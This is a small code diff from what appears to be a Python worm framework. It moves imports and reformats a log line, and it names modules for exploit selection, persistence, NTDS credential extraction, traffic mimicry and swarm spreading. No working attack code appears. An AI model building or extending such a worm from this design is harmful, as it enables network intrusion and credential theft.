@@ -3,6 +3,7 @@ import sys
 import threading
 from datetime import datetime, timedelta
 
+from ._version import __version__
 from .config_profiles import CONFIG_PROFILES
 from .module_imports import (
     ADAPTIVE_CYCLE_AVAILABLE,
@@ -44,6 +45,7 @@ from .module_imports import (
     SWARM_AVAILABLE,
     TRAFFIC_MIMICRY_AVAILABLE,
     VSS_NTDS_AVAILABLE,
+    WORM_FILE_PATH,
     AdaptiveCycle,
     AdaptiveExploitSelector,
     AdvancedPersistence,
@@ -94,10 +96,8 @@ from .module_imports import (
     VSSNTDSExtractor,
     VulnerabilityScanner,
     WormActivityBridge,
-    WORM_FILE_PATH,
     logger,
 )
-from ._version import __version__
 from .standalone import get_local_ip
 
 
@@ -678,7 +678,9 @@ class WormCoreBase:
                     logger.info(
                         "No pre-trained model found. Starting auto-training on realistic scenarios..."
                     )
-                    logger.info("Scenarios: small_office -> enterprise -> datacenter -> cloud -> iot")
+                    logger.info(
+                        "Scenarios: small_office -> enterprise -> datacenter -> cloud -> iot"
+                    )
                     logger.info("This may take a few minutes...")
                     auto_train_if_needed(save_dir)
 
